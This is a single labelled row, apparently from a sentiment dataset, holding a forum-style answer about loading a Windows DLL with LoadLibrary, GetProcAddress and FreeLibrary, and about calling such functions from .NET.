2895699,neutral,0.0467289719626168,"Ok heres the steps for calling the functions:
Call LoadLibrary(""mydll.dll"") which will give you a HMODULE to the loaded DLL
Call GetProcAddress(handleReturnedFromLoadLibrary, ""MyFunctionName"") which will return a function pointer to the function requested
Call FreeLibrary(handleReturnedFromLoadLibrary) to free the loaded DLL, once you have finished using its functions
As for calling them from .NET I'm not sure, I know it can be done though.
